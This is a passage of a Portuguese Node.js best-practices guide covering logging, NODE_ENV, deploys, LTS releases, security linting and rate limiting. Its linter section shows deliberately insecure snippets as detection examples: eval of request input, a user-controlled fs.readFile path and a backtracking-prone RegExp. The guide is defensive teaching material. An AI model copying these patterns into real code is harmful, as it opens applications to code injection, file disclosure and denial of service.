<p>…Usá-lo para gerenciar as dependências da sua aplicação é poderoso e conveniente. Mas os pacotes que você usa podem conter vulnerabilidades críticas de segurança que também podem afetar sua aplicação. A segurança da sua aplicação é tão forte quanto o “elo mais fraco” em suas dependências. Felizmente, existem duas ferramentas úteis que você pode usar para garantir os pacotes de terceiros que você usa: nsp e requireSafe. Estas duas ferramentas fazem basicamente a mesma coisa, então usar ambos pode ser um exagero, mas “melhor prevenir do que remediar” são palavras para se viver quando se trata de segurança …</p>
</blockquote>
<h2>5.14. Atribua‘TransactionId’ para cada declaração de log</h2>
<p><strong>TL;DR:</strong> Atribua o mesmo identificador, transaction-id: {some value}, para cada entrada de log dentro de um mesmo request. Depois, ao inspecionar erros em logs, conclua facilmente o que aconteceu antes e depois. Infelizmente, isso não é fácil de se conseguir no Node, devido à sua natureza assíncrona. Veja exemplos de código.</p>
<p><strong>Caso contrário:</strong> Observar um log de erros de produção sem o contexto - o que aconteceu antes - torna muito mais difícil e mais lento raciocinar sobre o problema.</p>
<h1>Atribua‘TransactionId’ para cada declaração de log</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Um log típico é um armazém de entradas de todos os componentes e requisições. Após a detecção de alguma linha ou erro suspeito, torna-se difícil combinar outras linhas que pertencem ao mesmo fluxo específico (por exemplo, o usuário “João” tentou comprar algo). Isso se torna ainda mais crítico e desafiador em um ambiente de microsserviço quando uma requisição/transação pode se estender por vários computadores. Aborde isso atribuindo um valor de identificador de transação exclusivo a todas as entradas da mesma solicitação, para que, ao detectar uma linha, você possa copiar o id e pesquisar por todas as linhas que possuam ID de transação semelhante. No entanto, alcançar isso no Node não é simples, pois um único thread é usado para atender a todas as solicitações - considere o uso de uma biblioteca que possa agrupar dados no nível de requisições - veja o exemplo de código no próximo slide. Ao chamar outro microsserviço, passe o Id da transação usando um cabeçalho HTTP como “x-transaction-id” para manter o mesmo contexto.</p>
<h3>Exemplo de código: configuração típica do Express</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// ao receber um novo pedido, inicie um novo contexto isolado e defina um ID de transação. O exemplo a seguir está usando a continuação da biblioteca npm-local-storage para isolar solicitações</span>

<span class="token keyword">const</span> <span class="token punctuation">{</span> createNamespace <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'continuation-local-storage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> session <span class="token operator">=</span> <span class="token function">createNamespace</span><span class="token punctuation">(</span><span class="token string">'minha sessão'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/:id'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    session<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'transactionId'</span><span class="token punctuation">,</span> <span class="token string">'algum GUID único'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    someService<span class="token punctuation">.</span><span class="token function">getById</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>
    logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'Começando agora para obter algo por Id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Agora, qualquer outro serviço ou componente pode ter acesso aos dados contextuais, por requisição</span>
<span class="token keyword">class</span> <span class="token class-name">someService</span> <span class="token punctuation">{</span>
    <span class="token function">getById</span><span class="token punctuation">(</span><span class="token parameter">id</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>“Starting to <span class="token keyword">get</span> something by Id”<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// outra lógica vem aqui</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// O logger agora pode anexar o ID da transação a cada entrada para que as entradas da mesma requisição tenham o mesmo valor</span>
<span class="token keyword">class</span> <span class="token class-name">logger</span> <span class="token punctuation">{</span>
    <span class="token function">info</span> <span class="token punctuation">(</span><span class="token parameter">message</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>message<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>session<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'transactionId'</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>5.15. Defina NODE_ENV=production</h2>
<p><strong>TL;DR:</strong> Defina a variável de ambiente NODE_ENV para ‘production’ ou ‘development’ para sinalizar se as otimizações de produção devem ser ativadas - muitos pacotes npm determinam o ambiente atual e otimizam seu código para produção.</p>
<p><strong>Caso contrário:</strong> Omitir esta simples propriedade pode degradar muito o desempenho. Por exemplo, ao utilizar o Express para renderização do lado do servidor, omitir o NODE_ENV o torna mais lento!</p>
<h1>Defina NODE_ENV = production</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Variáveis ​​de ambiente de processo são um conjunto de pares de valores-chave disponibilizados para qualquer programa em execução, geralmente para propósitos de configuração. Embora quaisquer variáveis ​​possam ser usadas, o Node incentiva a convenção de usar uma variável chamada NODE_ENV para sinalizar se estamos em produção no momento. Essa determinação permite que os componentes forneçam diagnósticos melhores durante o desenvolvimento, por exemplo, desativando o armazenamento em cache ou emitindo instruções de log detalhadas. Qualquer ferramenta de implantação moderna - Chef, Puppet, CloudFormation, outros - suporta a configuração de variáveis ​​de ambiente durante a implantação.</p>
<h3>Exemplo de código: definindo e lendo a variável de ambiente NODE_ENV</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// Configurando variáveis ​​de ambiente no bash antes de iniciar o processo do Node</span>
$ <span class="token constant">NODE_ENV</span><span class="token operator">=</span>development
$ node

<span class="token comment">// Lendo a Variável de Ambiente Usando Código</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">NODE_ENV</span> <span class="token operator">===</span> “production”<span class="token punctuation">)</span>
    useCaching <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>O que Outros Blogueiros Dizem</h3>
<p>Do blog <a href="https://www.dynatrace.com/blog/the-drastic-effects-of-omitting-node_env-in-your-express-js-applications/" target="_blank" rel="nofollow noopener noreferrer">dynatrace</a>:</p>
<blockquote>
<p>…No Node.js há uma convenção para usar uma variável chamada NODE<em>ENV para definir o modo atual. Vimos que, de fato, NODE</em>ENV é lida e o padrão é “development”, se não estiver definido. Observamos claramente que, configurando NODE<em>ENV para produção, o número de requisições que o Node.js pode manipular aumenta em cerca de dois terços, enquanto o uso da CPU cai um pouco. Deixe-me enfatizar isso: A configuração NODE</em>ENV para produção torna sua aplicação 3 vezes mais rápida!*</p>
</blockquote>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/setnodeenv1.png?raw=true" alt="NODE_ENV=production" title="NODE_ENV=production"></p>
<h2>5.16. Projete deploys automáticos, atômicos e com tempo de inatividade zero</h2>
<p><strong>TL;DR:</strong> Pesquisas mostram que times que executam muitos deploys, reduzem a probabilidade de problemas graves em produção. Deploys rápidos e automatizados que não necessitam de processos manuais arriscados e significativo tempo de inatividade, melhoram o processo de deploy. Provavelmente, você irá alcançar isso usando Docker, combinado com ferramentas de CI, pois elas se tornaram o padrão do setor para deploy simplificado.</p>
<p><strong>Caso contrário:</strong> Deploys demorados -> tempo de inatividade de produção e erro relacionado a humanos -> equipe não-confiante com os deploys -> menos implantações e recursos.</p>
<h2>5.17. Use uma versão LTS do Node.js</h2>
<p><strong>TL;DR:</strong> Certifique de que você está usando uma versão LTS do Node.js para receber correção de bugs críticos, atualizações de segurança e melhorias de performance.</p>
<p><strong>Caso contrário:</strong> Bugs recentemente descobertos e vulnerabilidades podem ser usados para explorar uma aplicação em produção, e sua aplicação pode se tornar incompatível com vários módulos e mais difícil de manter.</p>
<h1>Use uma versão LTS do Node.js em produção</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Verifique se você está usando uma versão LTS (Long Term Support) do Node.js em produção para receber correções de bugs críticos, atualizações de segurança e melhorias de desempenho.</p>
<p>As versões LTS do Node.js são suportadas por pelo menos 18 meses e são indicadas por números de versão pares (por exemplo, 4, 6, 8). Eles são melhores para produção, já que a linha de lançamento LTS é focada em estabilidade e segurança, enquanto a linha de lançamento ‘Atual’ tem uma vida útil mais curta e atualizações mais frequentes no código. As alterações nas versões LTS estão limitadas a correções de bugs para estabilidade, atualizações de segurança, possíveis atualizações npm, atualizações de documentação e certos aprimoramentos de desempenho que podem ser demonstrados para não interromper aplicações. existentes.</p>
<h3>Leia em</h3>
<p>🔗 <a href="https://nodejs.org/en/about/releases/" target="_blank" rel="nofollow noopener noreferrer">Definições de lançamento do Node.js</a></p>
<p>🔗 <a href="https://github.com/nodejs/Release" target="_blank" rel="nofollow noopener noreferrer">Agenda de lançamento do Node.js</a></p>
<p>🔗 <a href="https://medium.com/@nodesource/essential-steps-long-term-support-for-node-js-8ecf7514dbd" target="_blank" rel="nofollow noopener noreferrer">Etapas Essenciais: Suporte de Longo Prazo para o Node.js por Rod Vagg</a></p>
<blockquote>
<p>…o cronograma de lançamentos incrementais dentro de cada um deles será impulsionado pela disponibilidade de correções de bugs, correções de segurança e outras pequenas, mas importantes, alterações. O foco será na estabilidade, mas a estabilidade também inclui a minimização do número de bugs conhecidos e a manutenção das preocupações de segurança à medida que elas surgem.</p>
</blockquote>
<h2>5.18. Não direcione logs dentro do aplicativo</h2>
<p><strong>TL;DR:</strong> O destino dos logs não devem ser codificados na unha por desenvolvedores, dentro do código da aplicação. Ao invés disso, deve ser definido pelo ambiente de execução no qual a aplicação é executada. Desenvolvedores devem escrever logs para stdout usando um utilitário logger e depois deixar o ambiente de execução (container, servidor, etc) canalizar o fluxo do stdout para o destino apropriado (por exemplo: Splunk, Graylog, ElasticSearch, etc).</p>
<p><strong>Caso contrário:</strong> Aplicações manipulando o roteamento de log === difícil de dimensionar, perda de logs, separação ruim de preocupações.</p>
<h1>Não direcione logs dentro do aplicativo</h1>
<h3>Explicação em um Parágrafo</h3>
<p>O código da aplicação não deve manipular o roteamento de log, mas deve usar um utilitário de logger para gravar em <code class="language-text">stdout/stderr</code>. “Roteamento de log” significa selecionar e enviar logs para um local diferente da aplicação ou processo da aplicação, por exemplo, gravar os logs em um arquivo, banco de dados etc. A razão para isso é principalmente dupla: 1) separação de interesses e 2) <a href="https://12factor.net/logs" target="_blank" rel="nofollow noopener noreferrer">Melhores práticas de 12 fatores para aplicações modernas</a>.</p>
<p>Muitas vezes pensamos em “separação de interesses” em termos de pedaços de código entre serviços e entre os próprios serviços, mas isso se aplica também aos componentes mais “infra-estruturais”. Seu código da aplicação não deve manipular algo que deve ser tratado pela infraestrutura/ambiente de execução (na maioria das vezes nos dias de hoje, contêineres). O que acontece se você definir os locais de log em sua aplicação, mas depois precisar alterar esse local? Isso resulta em uma alteração e implementação de código. Ao trabalhar com plataformas baseadas em contêiner/nuvem, os contêineres podem delegar e desligar ao escalar para demandas de desempenho, portanto, não podemos ter certeza de onde um arquivo de log terminará. O ambiente de execução (container) deve decidir para onde os arquivos de log serão roteados. O aplicativo deve apenas registrar o que precisa para <code class="language-text">stdout</code>/<code class="language-text">stderr</code>, e o ambiente de execução deve ser configurado para pegar o fluxo de log a partir de lá e roteá-lo para onde ele precisa ir. Além disso, aqueles na equipe que precisam especificar e/ou alterar os destinos de log geralmente não são desenvolvedores de aplicações, mas fazem parte do DevOps e podem não ter familiaridade com o código da aplicação. Isso impede que eles façam alterações facilmente.</p>
<h3>Exemplo de código - Anti-padrão: roteamento de log bem acoplado ao aplicativo</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">{</span> createLogger<span class="token punctuation">,</span> transports<span class="token punctuation">,</span> winston <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'winston'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> winston<span class="token operator">-</span>mongodb <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'winston-mongodb'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
<span class="token comment">// log para dois arquivos diferentes, que o aplicativo agora deve estar preocupado com</span>
<span class="token keyword">const</span> logger <span class="token operator">=</span> <span class="token function">createLogger</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  transports<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token keyword">new</span> <span class="token class-name">transports<span class="token punctuation">.</span>File</span><span class="token punctuation">(</span><span class="token punctuation">{</span> filename<span class="token operator">:</span> <span class="token string">'combined.log'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
 
  <span class="token punctuation">]</span><span class="token punctuation">,</span>
  exceptionHandlers<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token keyword">new</span> <span class="token class-name">transports<span class="token punctuation">.</span>File</span><span class="token punctuation">(</span><span class="token punctuation">{</span> filename<span class="token operator">:</span> <span class="token string">'exceptions.log'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
<span class="token comment">// log para MongoDB, que o aplicativo agora deve estar preocupado com</span>
winston<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>winston<span class="token punctuation">.</span>transports<span class="token punctuation">.</span>MongoDB<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Fazendo isso dessa maneira, a aplicação agora lida com lógica de aplicativo/lógica de negócios e lógica de roteamento de log!</p>
<h3>Exemplo de código - melhor tratamento de logs + exemplo do Docker</h3>
<p>In the application:</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> logger <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">winston<span class="token punctuation">.</span>Logger</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  level<span class="token operator">:</span> <span class="token string">'info'</span><span class="token punctuation">,</span>
  transports<span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token keyword">new</span> <span class="token punctuation">(</span>winston<span class="token punctuation">.</span>transports<span class="token punctuation">.</span>Console<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token punctuation">]</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

logger<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'info'</span><span class="token punctuation">,</span> <span class="token string">'Mensagem de Log de Teste com algum parâmetro %s'</span><span class="token punctuation">,</span> <span class="token string">'algum parâmetro'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> anything<span class="token operator">:</span> <span class="token string">'Este é um metadado'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Then, in the docker container <code class="language-text">daemon.json</code>:</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token punctuation">{</span>
  <span class="token string">"log-driver"</span><span class="token operator">:</span> <span class="token string">"splunk"</span><span class="token punctuation">,</span> <span class="token comment">// usando apenas o Splunk como exemplo, poderia ser outro tipo de armazenamento</span>
  <span class="token string">"log-opts"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token string">"splunk-token"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
    <span class="token string">"splunk-url"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
    <span class="token operator">...</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Então este exemplo acaba ficando como <code class="language-text">log -&gt; stdout -&gt; Docker container -&gt; Splunk</code></p>
<h3>Citação de Blog: “O’Reilly”</h3>
<p>Do <a href="https://www.oreilly.com/ideas/a-cloud-native-approach-to-logs" target="_blank" rel="nofollow noopener noreferrer">blog O’Reilly</a>,</p>
<blockquote>
<p>Quando você tem um número fixo de instâncias em um número fixo de servidores, o armazenamento de logs no disco parece fazer sentido. No entanto, quando sua aplicação pode ir dinamicamente de 1 instância em execução para 100 e você não tem ideia de onde essas instâncias estão sendo executadas, é necessário que seu provedor de nuvem lide com a agregação desses logs em seu nome.</p>
</blockquote>
<h3>Citação: “12-Factor”</h3>
<p>Do <a href="https://12factor.net/logs" target="_blank" rel="nofollow noopener noreferrer">guia de boas práticas 12-Factor</a>,</p>
<blockquote>
<p>Uma aplicação de doze fatores nunca se preocupa com o roteamento ou armazenamento de seu fluxo de saída. Não se deve tentar gravar ou gerenciar arquivos de log. Em vez disso, cada processo em execução grava seu fluxo de eventos, sem buffer, em stdout.</p>
</blockquote>
<blockquote>
<p>Nas implantações de teste ou de produção, o fluxo de cada processo será capturado pelo ambiente de execução, agrupado com todos os outros fluxos da aplicação e roteado para um ou mais destinos finais para visualização e arquivamento de longo prazo. Esses destinos de arquivamento não são visíveis ou configuráveis ​​pela aplicação e, em vez disso, são completamente gerenciados pelo ambiente de execução.</p>
</blockquote>
<h3>Exemplo: Visão geral da arquitetura usando o Docker e o Splunk como exemplo</h3>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/logging-overview.png?raw=true" alt="alt text" title="Visão geral de roteamento de log"></p>
<h1><code class="language-text">6. Boas Práticas em Segurança</code></h1>
<div align="center">
<img src="https://img.shields.io/badge/OWASP%20Threats-Top%2010-green.svg" alt="54 items">
</div>
<h2>6.1. Adote as regras de segurança do linter</h2>
<p><a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A1:Injection%20-green.svg" alt></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20XSS%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> Faça uso de plugins de linter relacionados à segurança, como por exemplo o <a href="https://github.com/nodesecurity/eslint-plugin-security" target="_blank" rel="nofollow noopener noreferrer">eslint-plugin-security</a> para capturar vulnerabilidades de segurança e erros o mais cedo possível, na melhor das hipóteses, enquanto estão sendo codificados. Isso pode ajudar a detectar pontos fracos de segurança, como usar o eval, invocar um processo filho ou importar um módulo com string literal (por exemplo, input do usuário). Clique em ‘Leia Mais’ abaixo para ver exemplos de códigos que serão capturados por um linter de segurança.</p>
<p><strong>Caso contrário:</strong> O que poderia ser um ponto fraco de segurança durante o desenvolvimento, pode se tornar um grande problema no ambiente de produção. Além disso, o projeto pode não seguir práticas de segurança de código consistentes, levando a vulnerabilidades sendo introduzidas ou segredos confidenciais comprometidos em repositórios remotos.</p>
<h1>Adote as regras de segurança do linter</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Plugins de segurança para ESLint e TSLint, como <a href="https://github.com/nodesecurity/eslint-plugin-security" target="_blank" rel="nofollow noopener noreferrer">eslint-plugin-security</a> e <a href="https://www.npmjs.com/package/tslint-config-security" target="_blank" rel="nofollow noopener noreferrer">tslint-config-security</a> oferecer verificações de segurança de código com base em várias vulnerabilidades conhecidas, como RegEx inseguras, o uso não seguro de <code class="language-text">eval()</code>, e nomes de arquivos não literais sendo usados ​​ao acessar o sistema de arquivos em uma aplicação. O uso de ganchos git como <a href="https://github.com/bahmutov/pre-git" target="_blank" rel="nofollow noopener noreferrer">pre-git</a> permite reforçar ainda mais quaisquer regras no controle de origem antes de serem distribuídas aos controles remotos, uma das quais pode ser verificar se nenhum segredo foi adicionado ao controle de origem.</p>
<h3>exemplo <code class="language-text">eslint-plugin-security</code></h3>
<p>Alguns exemplos de regras de prática inseguras detectadas por <code class="language-text">eslint-plugin-security</code>:</p>
<p><code class="language-text">detectar-pseudoRandomBytes</code></p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> insecure <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">pseudoRandomBytes</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p><code class="language-text">detectar-nome-de-arquivo-não-literal-em-fs</code></p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> path <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userinput<span class="token punctuation">;</span>
fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p><code class="language-text">detectar-eval-com-expressão</code></p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> userinput <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userinput<span class="token punctuation">;</span>
<span class="token function">eval</span><span class="token punctuation">(</span>userinput<span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>
<p><code class="language-text">detectar-regexp-não-literal</code></p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> unsafe <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token string">'/(x+x+)+y/)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>Um exemplo de execução do <code class="language-text">eslint-plugin-security</code> em um projeto Node.js com as práticas de código não seguras acima:</p>
<p><img src="https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/eslint-plugin-security.png?raw=true" alt="nsp check example"></p>
<h3>O que outros blogueiros dizem</h3>
<p>Do blog de <a href="https://www.safaribooksonline.com/blog/2014/03/28/using-eslint-plugins-node-js-app-security/" target="_blank" rel="nofollow noopener noreferrer">Adam Baldwin</a>:</p>
<blockquote>
<p>Um Linter não precisa ser apenas uma ferramenta para impor regras pedantes sobre espaço em branco, ponto-e-vírgula ou instruções eval. O ESLint fornece uma estrutura poderosa para eliminar uma ampla variedade de padrões potencialmente perigosos em seu código (expressões regulares, validação de entrada e assim por diante). Acho que ele fornece uma nova ferramenta poderosa que merece ser considerada por desenvolvedores de JavaScript preocupados com a segurança.</p>
</blockquote>
<h2>6.2. Limite requests simultâneos usando um middleware</h2>
<p><a href="https://www.owasp.org/index.php/Denial_of_Service" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20DDOS%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> Ataques DOS são muito populares e relativamente fáceis de conduzir. Implemente uma limitação de taxa, usando um serviço externo como balanceadores de carga de nuvem, firewalls de nuvem, nginx, o pacote <a href="https://www.npmjs.com/package/rate-limiter-flexible" target="_blank" rel="nofollow noopener noreferrer">rate-limiter-flexible</a>, ou (para aplicações menores e menos críticas) um middleware limitador de taxa (por exemplo, <a href="https://www.npmjs.com/package/express-rate-limit" target="_blank" rel="nofollow noopener noreferrer">express-rate-limit</a>)</p>
<p><strong>Caso contrário:</strong> Uma aplicação pode estar sujeita a um ataque resultando em uma queda do serviço, onde usuários reais recebem um serviço degradado ou indisponível.</p>
<h1>Limite requests simultâneos usando um middleware</h1>
<h3>Explicação em um Parágrafo</h3>
<p>A limitação de taxa deve ser implementada em seu aplicativo para proteger um aplicativo Node.js de ser sobrecarregado por muitas solicitações ao mesmo tempo. A limitação de taxa é uma tarefa que é melhor executada com um serviço projetado para essa tarefa, como o nginx, mas também é possível com o pacote <a href="https://www.npmjs.com/package/rate-limiter-flexible" target="_blank" rel="nofollow noopener noreferrer">rate-limiter-flexible</a> ou com um middleware de aplicação, como <a href="https://www.npmjs.com/package/express-rate-limit" target="_blank" rel="nofollow noopener noreferrer">express-rate-limiter</a> para aplicações Express.js.</p>
<h3>Exemplo de código: aplicativo Node.js puro com <a href="https://www.npmjs.com/package/rate-limiter-flexible" target="_blank" rel="nofollow noopener noreferrer">rate-limiter-flexible</a></h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> redis <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'redis'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token punctuation">{</span> RateLimiterRedis <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'rate-limiter-flexible'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> redisClient <span class="token operator">=</span> redis<span class="token punctuation">.</span><span class="token function">createClient</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
 enable_offline_queue<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Máximo de 20 requisições por segundo</span>
<span class="token keyword">const</span> rateLimiter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RateLimiterRedis</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
 storeClient<span class="token operator">:</span> redisClient<span class="token punctuation">,</span>
 points<span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>
 duration<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
 blockDuration<span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token comment">// bloqueia por 2 segundos se consumir mais de 20 pontos por segundo</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
 rateLimiter<span class="token punctuation">.</span><span class="token function">consume</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>socket<span class="token punctuation">.</span>remoteAddress<span class="token punctuation">)</span>
   <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">rateLimiterRes</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
      <span class="token comment">// Alguma lógica de aplicação aqui</span>

      res<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
